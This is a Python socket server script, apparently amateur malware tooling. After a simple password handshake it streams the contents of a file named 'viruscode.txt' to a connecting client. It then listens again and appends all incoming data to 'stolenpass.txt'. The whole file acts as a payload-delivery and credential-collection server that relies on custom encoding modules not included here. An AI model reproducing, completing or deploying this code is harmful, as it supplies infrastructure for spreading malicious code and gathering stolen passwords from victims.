import socket
import GETIP
import securechat
import time
import hasher

def ip_display():
    current_ip_address = GETIP.getIP()
    return current_ip_address

ip_dict = []

def Main():
    host = ''
    port = 5000
    mySocket = socket.socket()
    mySocket.bind((host, port))
    print('The IP address of the server for authorization is ' + str(ip_display()))
    # server_pass = hasher.salt_create()
    # print('The password for the server is ' + str(server_pass))
    mySocket.listen(1)
    conn, addr = mySocket.accept()
    global random_ip
    random_ip = str(addr)
    print('Attempted authorization from: ' + str(addr))
    ip_dict.append(addr)
    count = 0
    while True:
        data = conn.recv(1024).decode()
        attempted_password = securechat.decoding_el_message(str(data))
        if attempted_password != 'Confirmed' and count < 3:
            data = securechat.fixed(1)
            conn.send(data.encode())
            count += 1
        elif attempted_password == 'Confirmed' and count < 3:
            data = securechat.fixed(3)
            conn.send(data.encode())
            break
        else:
            data = securechat.fixed(4)
            conn.send(data.encode())
            print(str(addr) + ' is trying to hack you, maybe. It\'s count is ' + str(count))
            conn.close()
    f = open('viruscode.txt')
    lines = f.readlines()
    # i = 0
    for line in lines:
        line = line + '[$$$STOPPOINT$$$]'
        for word in line.split():
            data = conn.recv(1024).decode()
            message = securechat.decoding_el_message(data)
            if message == 'QUIT YOU MACHINE I NO WANT LOOP':
                break
            print(message)
            data = securechat.virus_message(word)
            conn.send(data.encode())
            data = conn.recv(1024).decode()
            message = securechat.decoding_el_message(data)
            if message == 'QUIT YOU MACHINE I NO WANT LOOP':
                break
            print(message)
            data = securechat.virus_message('\n')
            conn.send(data.encode())
    conn.close()
    mySocket.close()
    host = ''
    port = 5000
    mySocket = socket.socket()
    mySocket.bind((host, port))
    mySocket.listen(1)
    conn, addr = mySocket.accept()
    while True:
        data = conn.recv(1024).decode()
        # message = securechat.decoding_el_message(data)
        f = open('stolenpass.txt', 'a')
        # f.write(message)
        f.write(data)
        f.write('\n')
        f.close()
        # message = securechat.message_confirmed()
        conn.send('Confirmed'.encode())

Main()

